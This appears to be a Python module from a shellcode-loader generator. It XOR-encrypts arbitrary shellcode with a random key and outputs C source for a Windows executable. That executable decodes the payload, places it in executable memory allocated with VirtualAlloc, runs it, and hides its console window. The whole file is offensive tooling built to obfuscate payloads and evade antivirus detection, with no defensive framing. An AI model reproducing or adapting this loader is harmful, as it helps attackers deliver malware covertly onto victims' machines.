from ClassCongregation import BinaryDataTypeConversion,ShellcodeEncryptionAndDecryption
import random
import ast
__heading__="C-EXE-Windows-XOR-Yes-MemoryEnforcement-20210901-12/72"
__build__=""
__language__=".c"
__process__=".exe"

def main(Shellcode):
    BytesTypeBinaryData=BinaryDataTypeConversion().StringToBytes(ast.literal_eval(repr(Shellcode).replace("\\\\", "\\")))#对数据进行类型转换
    GenerateRandomNumber=random.randint(1, 255)#生成的随机数
    XOREncryption=ShellcodeEncryptionAndDecryption().XOREncryption(GenerateRandomNumber,BytesTypeBinaryData)#进行XOR加密
    Code = """
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口

unsigned char buf[] = \""""+XOREncryption+"""\";
int main()

{
    LPVOID Memory;
for(int i = 0;i<sizeof(buf); i++){
  buf[i] ^= """+str(GenerateRandomNumber)+""";
}
    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(Memory, buf, sizeof(buf));

    ((void(*)())Memory)();
    return 0;

}"""
    return Code